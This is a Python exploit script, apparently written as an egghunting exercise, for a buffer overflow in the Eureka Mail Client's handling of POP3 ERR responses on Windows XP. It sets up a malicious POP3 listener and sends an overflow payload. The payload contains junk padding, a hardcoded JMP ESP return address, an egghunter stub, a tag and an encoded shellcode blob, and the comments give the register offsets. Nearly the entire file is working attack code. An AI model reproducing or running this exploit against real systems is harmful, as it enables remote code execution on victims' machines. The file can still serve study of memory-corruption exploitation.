#!/usr/bin/python

# Author: Michael Music
# Date: 6/24/2019
# Description: Eureka Mail Client ERR Buffer Overflow Exploit
#  Exercise in egghunting
#  Tested on Windows XP
# Notes:

import socket

# EIP at offset 710
# ESP at offset 714
# EDI at offset 2997
# ESP has around 200 bytes of space
# EDI has 1000+ bytes of space
# CALL EDI located at 0x7e41c891 in user32.dll
# JMP ESP located at 0x7e429353

ip = '192.168.1.100'

junk = 'A' * 710
eip = '\x53\x93\x42\x7e'
egghunter_nop_sled = '\x90' * 8
egghunter = '\x66\x81\xca\xff\x0f\x42\x52\x6a\x02\x58\xcd\x2e\x3c\x05\x5a\x74\xef\xb8' + '\x77\x30\x30\x74' + '\x8b\xfa\xaf\x75\xea\xaf\x75\xe7\xff\xe7'
padding = '\x90' * 1000
tag = 'w00tw00t'
shellcode =  ""
shellcode += "\xdb\xdd\xd9\x74\x24\xf4\x5b\x53\x59\x49\x49\x49\x43"
shellcode += "\x43\x43\x43\x43\x43\x43\x51\x5a\x56\x54\x58\x33\x30"
shellcode += "\x56\x58\x34\x41\x50\x30\x41\x33\x48\x48\x30\x41\x30"
shellcode += "\x30\x41\x42\x41\x41\x42\x54\x41\x41\x51\x32\x41\x42"
shellcode += "\x32\x42\x42\x30\x42\x42\x58\x50\x38\x41\x43\x4a\x4a"
shellcode += "\x49\x4b\x4c\x4d\x38\x4d\x52\x35\x50\x55\x50\x35\x50"
shellcode += "\x55\x30\x4c\x49\x4b\x55\x36\x51\x49\x50\x45\x34\x4c"
shellcode += "\x4b\x30\x50\x56\x50\x4c\x4b\x31\x42\x34\x4c\x4c\x4b"
shellcode += "\x30\x52\x55\x44\x4c\x4b\x33\x42\x36\x48\x44\x4f\x48"
shellcode += "\x37\x31\x5a\x51\x36\x30\x31\x4b\x4f\x4e\x4c\x37\x4c"
shellcode += "\x35\x31\x53\x4c\x45\x52\x46\x4c\x51\x30\x4f\x31\x58"
shellcode += "\x4f\x54\x4d\x53\x31\x4f\x37\x4d\x32\x4b\x42\x46\x32"
shellcode += "\x50\x57\x4c\x4b\x50\x52\x54\x50\x4c\x4b\x31\x5a\x57"
shellcode += "\x4c\x4c\x4b\x50\x4c\x34\x51\x42\x58\x4d\x33\x51\x58"
shellcode += "\x45\x51\x38\x51\x50\x51\x4c\x4b\x56\x39\x57\x50\x33"
shellcode += "\x31\x59\x43\x4c\x4b\x47\x39\x54\x58\x4b\x53\x57\x4a"
shellcode += "\x51\x59\x4c\x4b\x30\x34\x4c\x4b\x45\x51\x59\x46\x46"
shellcode += "\x51\x4b\x4f\x4e\x4c\x39\x51\x38\x4f\x44\x4d\x53\x31"
shellcode += "\x48\x47\x46\x58\x4d\x30\x53\x45\x4c\x36\x35\x53\x33"
shellcode += "\x4d\x4b\x48\x47\x4b\x43\x4d\x37\x54\x53\x45\x4d\x34"
shellcode += "\x50\x58\x4c\x4b\x36\x38\x51\x34\x43\x31\x48\x53\x45"
shellcode += "\x36\x4c\x4b\x34\x4c\x50\x4b\x4c\x4b\x30\x58\x55\x4c"
shellcode += "\x33\x31\x4e\x33\x4c\x4b\x33\x34\x4c\x4b\x35\x51\x38"
shellcode += "\x50\x4d\x59\x50\x44\x56\x44\x47\x54\x31\x4b\x51\x4b"
shellcode += "\x45\x31\x46\x39\x30\x5a\x56\x31\x4b\x4f\x4d\x30\x51"
shellcode += "\x4f\x51\x4f\x50\x5a\x4c\x4b\x45\x42\x5a\x4b\x4c\x4d"
shellcode += "\x51\x4d\x42\x4a\x33\x31\x4c\x4d\x4c\x45\x58\x32\x45"
shellcode += "\x50\x45\x50\x43\x30\x36\x30\x55\x38\x30\x31\x4c\x4b"
shellcode += "\x42\x4f\x4d\x57\x4b\x4f\x48\x55\x4f\x4b\x4a\x50\x38"
shellcode += "\x35\x49\x32\x36\x36\x53\x58\x4f\x56\x4c\x55\x4f\x4d"
shellcode += "\x4d\x4d\x4b\x4f\x48\x55\x37\x4c\x35\x56\x43\x4c\x44"
shellcode += "\x4a\x4b\x30\x4b\x4b\x4d\x30\x33\x45\x33\x35\x4f\x4b"
shellcode += "\x30\x47\x45\x43\x33\x42\x52\x4f\x52\x4a\x35\x50\x51"
shellcode += "\x43\x4b\x4f\x39\x45\x45\x33\x43\x51\x32\x4c\x33\x53"
shellcode += "\x56\x4e\x32\x45\x32\x58\x43\x55\x53\x30\x41\x41"

buf = '-ERR ' + junk + eip + egghunter_nop_sled + egghunter + padding + tag + shellcode
buf += 'D' * (5000 - (len(buf) - 4))

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.bind((ip,110))
s.listen(10)

print '[+] Waiting for connection...'

client_socket, client_address = s.accept()

print '[+] Accepted connection'

while True:
    print '[+] Attempting to send payload'
    client_socket.send(buf)

s.close()

print '[+] Connection closed'
